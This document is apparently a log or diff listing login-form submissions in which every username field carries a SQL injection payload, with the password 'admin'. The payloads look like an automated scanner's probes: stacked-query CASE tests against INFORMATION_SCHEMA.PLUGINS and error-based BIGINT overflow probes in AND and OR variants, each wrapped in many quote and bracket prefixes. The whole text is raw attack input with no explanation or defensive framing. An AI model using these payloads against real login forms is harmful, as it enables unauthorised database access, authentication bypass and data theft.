+User Name:admin")) AS BtSM WHERE 4684=4684;SELECT (CASE WHEN (9035=4104) THEN 9035 ELSE 9035*(SELECT 9035 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin")) AS wBbs WHERE 9777=9777;SELECT (CASE WHEN (7844=7844) THEN 7844 ELSE 7844*(SELECT 7844 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin¿') AS GlAw WHERE 2319=2319;SELECT (CASE WHEN (7843=4341) THEN 7843 ELSE 7843*(SELECT 7843 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin¿') AS yudI WHERE 2512=2512;SELECT (CASE WHEN (7844=7844) THEN 7844 ELSE 7844*(SELECT 7844 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin") AS WXKN WHERE 8652=8652;SELECT (CASE WHEN (9255=3403) THEN 9255 ELSE 9255*(SELECT 9255 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin") AS GERx WHERE 9088=9088;SELECT (CASE WHEN (7844=7844) THEN 7844 ELSE 7844*(SELECT 7844 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin"="admin";SELECT (CASE WHEN (5440=4011) THEN 5440 ELSE 5440*(SELECT 5440 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin"="admin";SELECT (CASE WHEN (7844=7844) THEN 7844 ELSE 7844*(SELECT 7844 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin¿' IN BOOLEAN MODE);SELECT (CASE WHEN (9404=1651) THEN 9404 ELSE 9404*(SELECT 9404 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin¿' IN BOOLEAN MODE);SELECT (CASE WHEN (7844=7844) THEN 7844 ELSE 7844*(SELECT 7844 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin);SELECT (CASE WHEN (9635=6977) THEN 9635 ELSE 9635*(SELECT 9635 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin);SELECT (CASE WHEN (7844=7844) THEN 7844 ELSE 7844*(SELECT 7844 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin));SELECT (CASE WHEN (5163=5628) THEN 5163 ELSE 5163*(SELECT 5163 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin));SELECT (CASE WHEN (7844=7844) THEN 7844 ELSE 7844*(SELECT 7844 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin)));SELECT (CASE WHEN (1911=3625) THEN 1911 ELSE 1911*(SELECT 1911 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin)));SELECT (CASE WHEN (7844=7844) THEN 7844 ELSE 7844*(SELECT 7844 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin;SELECT (CASE WHEN (2153=2670) THEN 2153 ELSE 2153*(SELECT 2153 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin;SELECT (CASE WHEN (7844=7844) THEN 7844 ELSE 7844*(SELECT 7844 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin)) AS EtiX WHERE 8318=8318;SELECT (CASE WHEN (3317=6951) THEN 3317 ELSE 3317*(SELECT 3317 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin)) AS fsFX WHERE 5467=5467;SELECT (CASE WHEN (7844=7844) THEN 7844 ELSE 7844*(SELECT 7844 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin) AS wkYh WHERE 5539=5539;SELECT (CASE WHEN (3634=7621) THEN 3634 ELSE 3634*(SELECT 3634 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin) AS ZNHB WHERE 9283=9283;SELECT (CASE WHEN (7844=7844) THEN 7844 ELSE 7844*(SELECT 7844 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin` WHERE 4532=4532;SELECT (CASE WHEN (1154=4310) THEN 1154 ELSE 1154*(SELECT 1154 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin` WHERE 3574=3574;SELECT (CASE WHEN (7844=7844) THEN 7844 ELSE 7844*(SELECT 7844 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin`) WHERE 9754=9754;SELECT (CASE WHEN (8614=6177) THEN 8614 ELSE 8614*(SELECT 8614 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin`) WHERE 4743=4743;SELECT (CASE WHEN (7844=7844) THEN 7844 ELSE 7844*(SELECT 7844 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin`=`admin`;SELECT (CASE WHEN (5611=8958) THEN 5611 ELSE 5611*(SELECT 5611 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin`=`admin`;SELECT (CASE WHEN (7844=7844) THEN 7844 ELSE 7844*(SELECT 7844 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin]-(SELECT 0 WHERE 2671=2671;SELECT (CASE WHEN (8415=5589) THEN 8415 ELSE 8415*(SELECT 8415 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin]-(SELECT 0 WHERE 2851=2851;SELECT (CASE WHEN (7844=7844) THEN 7844 ELSE 7844*(SELECT 7844 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin¿') AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- WbvzPassword:admin
+User Name:admin¿' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- dAcAPassword:admin
+User Name:admin" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- RuJNPassword:admin
+User Name:admin¿') AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))'QWFj¿'1Password:admin
+User Name:admin¿')) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))'uNti¿'1Password:admin
+User Name:admin¿'))) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))'gANr¿'1Password:admin
+User Name:admin¿' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))'EkGu¿'1Password:admin
+User Name:admin¿') AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))'fwly¿'1Password:admin
+User Name:admin¿')) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))'BcOS¿'1Password:admin
+User Name:admin¿'))) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))'JZnI¿'1Password:admin
+User Name:admin%¿' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))'DtWX¿'1Password:admin
+User Name:admin¿' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))'ZIMp¿'1Password:admin
+User Name:admin") AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ("RnKe"="RnKePassword:admin
+User Name:admin")) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND (("uhEs"="uhEsPassword:admin
+User Name:admin"))) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((("eiYa"="eiYaPassword:admin
+User Name:admin" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND "Fikw"="FikwPassword:admin
+User Name:admin") AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ("JKNb" LIKE "JKNbPassword:admin
+User Name:admin")) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND (("ncJv" LIKE "ncJvPassword:admin
+User Name:admin"))) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((("kGny" LIKE "kGnyPassword:admin
+User Name:admin" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND "gNQE" LIKE "gNQEPassword:admin
+User Name:admin¿' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))'dBDl¿'1Password:admin
+User Name:admin¿') WHERE 7541=7541 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- RcxNPassword:admin
+User Name:admin") WHERE 1205=1205 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- uTwiPassword:admin
+User Name:admin¿' WHERE 8523=8523 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- ElBAPassword:admin
+User Name:admin" WHERE 8732=8732 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- TxJrPassword:admin
+User Name:admin¿'||(SELECT 0x68794e52 WHERE 4489=4489 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))))||'¿'1Password:admin
+User Name:admin¿'||(SELECT 0x6970466e FROM DUAL WHERE 9545=9545 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))))||'¿'1Password:admin
+User Name:admin¿'+(SELECT 0x62434849 WHERE 6046=6046 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))))+'¿'1Password:admin
+User Name:admin||(SELECT 0x59697374 FROM DUAL WHERE 1456=1456 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))))||Password:admin
+User Name:admin||(SELECT 0x6e755769 WHERE 6821=6821 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))))||Password:admin
+User Name:admin+(SELECT 0x68566155 WHERE 6202=6202 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))))+Password:admin
+User Name:admin¿')) AS lYyG WHERE 1309=1309 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- gZAYPassword:admin
+User Name:admin")) AS ByFT WHERE 4206=4206 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- bnKZPassword:admin
+User Name:admin¿') AS pNwI WHERE 5831=5831 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- gplrPassword:admin
+User Name:admin") AS kuTp WHERE 2849=2849 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- wvunPassword:admin
+User Name:admin"="admin" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND "admin"="adminPassword:admin
+User Name:admin¿' IN BOOLEAN MODE) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))#Password:admin
+User Name:admin) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- IhOLPassword:admin
+User Name:admin) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND (6633=6633Password:admin
+User Name:admin)) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((1900=1900Password:admin
+User Name:admin))) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND (((9660=9660Password:admin
+User Name:admin AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))Password:admin
+User Name:admin AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- NCOSPassword:admin
+User Name:admin AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))# RNurPassword:admin
+User Name:admin) WHERE 1660=1660 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- asNEPassword:admin
+User Name:admin WHERE 8015=8015 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- bmVgPassword:admin
+User Name:admin+(SELECT xRvu WHERE 8477=8477 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))))+Password:admin
+User Name:admin)) AS Wvfc WHERE 7953=7953 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- KITsPassword:admin
+User Name:admin) AS QBBE WHERE 4746=4746 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- HjxlPassword:admin
+User Name:admin` WHERE 3841=3841 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- qBhxPassword:admin
+User Name:admin`) WHERE 4425=4425 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- dYcbPassword:admin
+User Name:admin`=`admin` AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND `admin`=`adminPassword:admin
+User Name:admin]-(SELECT 0 WHERE 6257=6257 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8152=8152,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))))|[adminPassword:admin
+User Name:admin¿') OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- wSUDPassword:admin
+User Name:admin¿' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- fhUzPassword:admin
+User Name:admin" OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- PCHPPassword:admin
+User Name:admin¿') OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))'NiVp¿'1Password:admin
+User Name:admin¿')) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))'GnzD¿'1Password:admin
+User Name:admin¿'))) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))'OoJm¿'1Password:admin
+User Name:admin¿' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))'lsan¿'1Password:admin
+User Name:admin¿') OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))'UYNu¿'1Password:admin
+User Name:admin¿')) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))'ZRbc¿'1Password:admin
+User Name:admin¿'))) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))'zMkC¿'1Password:admin
+User Name:admin%¿' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))'oAWz¿'1Password:admin
+User Name:admin¿' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))'fttf¿'1Password:admin
+User Name:admin") OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ("fOHH"="fOHHPassword:admin
+User Name:admin")) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND (("WMOl"="WMOlPassword:admin
+User Name:admin"))) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((("vGyc"="vGycPassword:admin
+User Name:admin" OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND "gVir"="gVirPassword:admin
+User Name:admin") OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ("cetP" LIKE "cetPPassword:admin
+User Name:admin")) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND (("HhlC" LIKE "HhlCPassword:admin
+User Name:admin"))) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((("VaGn" LIKE "VaGnPassword:admin
+User Name:admin" OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND "UPkx" LIKE "UPkxPassword:admin
+User Name:admin¿' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))'pxnA¿'1Password:admin
+User Name:admin¿') WHERE 4682=4682 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- HnZEPassword:admin
+User Name:admin") WHERE 1680=1680 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- fPxWPassword:admin
+User Name:admin¿' WHERE 2838=2838 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- ypprPassword:admin
+User Name:admin" WHERE 9149=9149 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- bHCqPassword:admin
+User Name:admin¿'||(SELECT 0x70627764 WHERE 2952=2952 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))))||'¿'1Password:admin
+User Name:admin¿'||(SELECT 0x796a7444 FROM DUAL WHERE 8725=8725 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))))||'¿'1Password:admin
+User Name:admin¿'+(SELECT 0x7a6c4669 WHERE 8419=8419 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))))+'¿'1Password:admin
+User Name:admin||(SELECT 0x564f4c6d FROM DUAL WHERE 5041=5041 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))))||Password:admin
+User Name:admin||(SELECT 0x50726358 WHERE 5557=5557 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))))||Password:admin
+User Name:admin+(SELECT 0x7257464e WHERE 1654=1654 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))))+Password:admin
+User Name:admin¿')) AS pBJx WHERE 1920=1920 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- WMfcPassword:admin
+User Name:admin")) AS CqIU WHERE 9780=9780 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- lMDFPassword:admin
+User Name:admin¿') AS moCO WHERE 2794=2794 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- UgGAPassword:admin
+User Name:admin") AS wTEO WHERE 3423=3423 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- IVDFPassword:admin
+User Name:admin"="admin" OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND "admin"="adminPassword:admin
+User Name:admin¿' IN BOOLEAN MODE) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))#Password:admin
+User Name:admin) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- ZNFFPassword:admin
+User Name:admin) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND (8270=8270Password:admin
+User Name:admin)) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((4257=4257Password:admin
+User Name:admin))) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND (((4551=4551Password:admin
+User Name:admin OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))Password:admin
